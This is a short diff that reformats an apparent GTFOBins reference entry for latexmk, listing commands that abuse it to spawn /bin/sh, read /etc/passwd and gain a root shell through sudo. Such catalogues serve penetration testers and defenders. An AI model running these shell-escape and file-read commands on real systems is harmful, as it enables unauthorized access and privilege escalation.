@@ -1,10 +1,14 @@
+---
 description: This allows to execute [`perl`](/gtfobins/perl/) code.
 functions:
   shell:
-    - code: latexmk -e 'exec "/bin/sh";'
-    - code: latexmk -latex='/bin/sh #' /dev/null
+    - code: |
+        latexmk -e 'exec "/bin/sh";'
+    - code: |
+        latexmk -latex='/bin/sh #' /dev/null
   file-read:
-    - code: latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
+    - code: |
+        latexmk -e 'open(X,"/etc/passwd");while(<X>){print $_;}exit'
     - description: The read file will be part of the output.
       code: |
         TF=$(mktemp)
@@ -12,3 +16,4 @@ functions:
         strings tmp.dvi
   sudo:
     - code: sudo latexmk -e 'exec "/bin/sh";'
+---
